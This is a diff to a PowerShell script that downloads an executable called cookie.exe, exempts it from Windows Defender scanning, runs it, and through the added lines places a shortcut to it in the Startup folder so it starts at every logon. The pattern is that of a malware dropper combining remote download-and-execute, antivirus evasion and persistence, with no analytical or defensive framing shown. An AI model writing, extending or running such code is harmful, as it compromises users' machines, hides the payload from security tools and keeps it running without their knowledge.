@@ -7,4 +7,12 @@ $C=[System.IO.Path]::Combine($A,'cookie.exe')
 Invoke-WebRequest -Uri $B -OutFile $C
 try{Add-MpPreference -ExclusionProcess $C}catch{}
 Start-Process -FilePath $C -ArgumentList '-Bypass'
+
+$StartupPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
+$ShortcutPath = [System.IO.Path]::Combine($StartupPath, 'cookie.lnk')
+$WshShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut($ShortcutPath)
+$Shortcut.TargetPath = $C
+$Shortcut.Save()
+
 Exit"
